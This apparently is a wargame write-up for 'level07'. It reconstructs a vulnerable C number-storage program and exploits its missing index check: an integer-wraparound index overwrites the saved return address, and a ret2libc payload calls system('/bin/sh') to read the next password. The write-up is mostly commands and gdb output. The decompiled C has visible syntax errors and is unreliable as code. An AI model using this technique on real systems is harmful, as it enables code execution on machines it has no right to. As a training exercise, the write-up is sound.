## level07 (integer overflow)
```clike=
void clear_stdin()
{
    char curr;
    
    while(1)
    {
        curr = getchar();
        if (curr == '\n' || curr == -1)
            return ;
    }
}

unsigned int get_unum()
{
    unsigned int res;
    
    fflush(stdout);
    scanf("%u", &res);
    clear_stdin();
    return res;
}

int store_number( int *meat)
{    
    unsigned int num_input = 0;
    unsigned int idx_input = 0
    unsigned int temp1 = 0xaaaaaaab;
        
    printf("Number: ")
    num_input = get_unum();
    printf("Index: ")
    idx_input = get_unum();
    
    idx_input += temp1;
    temp1 = temp1 >> 1;
    unsigned int temp2 = temp1;
    temp2 *= 2;
    temp2 += temp1;
    unsigned int temp3 = 0xaaaaaaab - temp2;
    if(temp3 != 0 || num_input >> 0x18 != 0xb7)
    {
        meat[idx_input] = num_input;
        return 0;
    }
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
}

int read_number(unsigned int *meat)
{
    int num_input = 0;
    
    printf("Index: ");
    num_input = get_unum() << 2 + meat;
    printf("Number at data[%u] is %u, ", num_input, meat[num_input]); // does << 2 + meat implicitly
    return 0;
}


int main(int argc, char **argv, char **envp)
{
    char **argv_stack = argv;
    char **envp_stack = enp;
    int op_ret = 0;
    char user_cmd[20] = 0; // 4 * 5
    int meat[16]; // 64 / 4
    
    memset(meat, 0, 16);
    while(argv_stack)
    {
        memset(*argv_stack, 0, strlen(*argv_stack));
        ++argv_stack;
    }
    
    while(envp_stack)
    {
        memset(*envp_stack, 0, strlen(*envp_stack));
        ++envp_stack;
    }
    
     puts("----------------------------------------------------\n"\
           "  Welcome to wil's crappy number storage service!   \n"\
           "----------------------------------------------------\n"\
           " Commands:                                          \n"\
           "    store - store a number into the data storage    \n"\
           "    read  - read a number from the data storage     \n"\
           "    quit  - exit the program                        \n"\
           "----------------------------------------------------\n"\
           "   wil has reserved some storage :>                 \n"\
           "----------------------------------------------------\n"\
           "\n");
    
    while(1)
    {
        op_ret = 1；
        printf("Input command: ");
        fgets(user_cmd, 20, stdin);
        user_cmd[strcspn(user_cmd, "\n")] = 0;
        
        if (!strncmp(user_cmd, "store", 5))
            op_ret = store_number(meat);
        else if (!strncmp(user_cmd, "read", 4))
            op_ret = read_number(meat);
        else if (strncmp(user_cmd, "quit", 4))
            break;
        
        if (!op_ret)
            printf("Completed %s command successfully", user_cmd);
        else 
            printf("Failed to do %s command\n", user_cmd);
       
       memset(user_cmd, 0, 20);
       op_ret = 1;
    }
    return 0;
}

```

This program allows is to **store numbers in an int buffer**. During the storing process, there is no check that the index is within the buffers size, they only check if it allowed other constraints such as some mathematical properties on the `idx_input` and `num_input`.

After some trials, we figurerd that the first constraint in `store_number(int )` checks if the index is a **not modulo of 3 `temp3 != 0`**. The second constraint checks if the number input is not `3070230528`. If any of those constraints are true, the number is written into the buffer at `meat[index] = input`. 

Since they dont do index size checking, we are able to segfault the program if we provide a faulty index.

![image](https://hackmd.io/_uploads/SJiut0yw6.png)

To determind the offset to the EIP, we try to input a test value and inspect the memory layout of the program.

```
cat << EOF > /tmp/level07
store
286331153
1
quit
EOF

gdb ./level07
b *0x80486ce
lay asm
focus cmd
tty /dev/pts/0
set disassembly-flavor intel
run < /tmp/level07
```
As we can see, `meat` at index 1 is at `0xffffd548`. And the EIP is at `0xffffd70c`. We are able to overwrite the EIP since the **EIP address is > the buffer address**. With this , we are able to find the offset which is `70c - 548 = 1C4 or 452 in base 10`.

```
(gdb) x/10x $eax
0xffffd548:     0x11111111      0x00000000      0x00000000      0x00000000
0xffffd558:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd568:     0x00000000      0x00000000
...
...

(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x80488ef in main; saved eip 0xf7e45513
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
```

The index we need to write to will be `452 / 4 = 113`. We can test this out
As we can see, we are 4 bytes before the EIP address. However, to actually overwrite the EIP, we need to input as index `114`, which is not allowed by the function. 
```
cat << EOF > /tmp/level07
store
286331153
113
quit
EOF

gdb ./level07
b *0x80486ce
b *0x80488ef
lay asm
focus cmd
tty /dev/pts/0
set disassembly-flavor intel
run < /tmp/level07
```
![image](https://hackmd.io/_uploads/rkWv71eDa.png)

To overcome this, we can use alternatives like **`2 * (UINT_MAX / 4) + 114` to overflow back to `114`** without actually using the number. As we can see, we have successfully overwritten the EIP with our desired value.

```
cat << EOF > /tmp/level07
store
286331153
2147483762
store
572662306
2147483764
quit
EOF

gdb ./level07
b *0x80486ce
b *0x80488ef
lay asm
focus cmd
tty /dev/pts/0
set disassembly-flavor intel
run < /tmp/level07
```

```
Breakpoint 2, 0x080488ef in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd710:
 eip = 0x80488ef in main; saved eip 0x11111111
 Arglist at 0xffffd708, args:
 Locals at 0xffffd708, Previous frame's sp is 0xffffd710
 Saved registers:
  ebx at 0xffffd6fc, ebp at 0xffffd708, esi at 0xffffd700, edi at 0xffffd704, eip at 0xffffd70c
  ```

Since we are able to ovewrite the address now, we should be able to overwrite it to an address which points to shellcode. We will be trying ret2libc for this. We needed the address for the `system()` function as well as `/bin/sh`. These information should be available in GDB. The address of `system()` is `0xf7e6aed0` and the address for "/bin/sh" is `0xf7f897ec` 

```
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
```

We can generate our payload like so and able to retreive the password `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`
```
cat << EOF > /tmp/level07
store
4159090384
2147483762
store
4160264172
2147483764
quit
EOF

(cat /tmp/level07 ; cat) | ./level07
```

![image](https://hackmd.io/_uploads/SJXwO-xP6.png)

